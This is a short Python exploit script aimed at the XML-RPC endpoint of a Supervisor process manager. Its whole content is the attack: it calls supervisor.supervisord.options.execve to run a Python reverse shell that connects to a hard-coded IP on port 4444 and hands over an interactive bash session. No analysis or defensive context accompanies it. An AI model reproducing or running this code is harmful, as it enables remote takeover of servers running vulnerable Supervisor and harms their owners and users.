# since supervisor will be replace this can only use once 
import requests

header = {
    "Content-Type": "text/xml",
    # "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

xml = """<methodCall>
<methodName>supervisor.supervisord.options.execve</methodName>
<params>
<param>
<string>/usr/bin/python</string>
</param>
<param>
<array>
<data>
<value><string>python</string></value>
<value><string>-c</string></value>
<value><string>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("140.115.197.136",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);</string></value>
</data>
</array>
</param>
<param>
<struct>
</struct>
</param>
</params>
</methodCall>"""

url = "http://140.115.197.136:9001/RPC2"

r = requests.post(url = url, data=xml , headers=header)

print(r)
print(r.content)

